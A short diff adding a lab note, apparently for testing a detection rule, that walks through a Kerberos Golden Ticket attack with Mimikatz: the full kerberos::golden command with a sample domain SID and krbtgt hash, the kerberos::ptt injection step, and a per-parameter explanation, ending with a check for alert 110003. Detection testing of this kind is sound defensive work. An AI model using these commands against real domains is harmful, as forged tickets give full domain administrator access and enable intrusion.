@@ -1,0 +1,11 @@
+. Golden Ticket Simulation
+•	Use Mimikatz:
+kerberos::ptt /ticket:GoldenTicket.krb
+kerberos::golden /user:Administrator /domain:WinServ.local /sid:S-1-5-21-3079670428-507354839-1974674015 /krbtgt:fb850d37e711e8b045c411f450a7c84b /id:500
+Explanation:
+/user:Administrator → account you want to forge a ticket for
+/domain:WinServ.local → your lab domain
+/sid: → domain SID (check with whoami /user)
+/krbtgt: → hash of krbtgt account you dumped from DCSync
+/id:500 → RID for Administrator
+•	Verify alert id 110003.
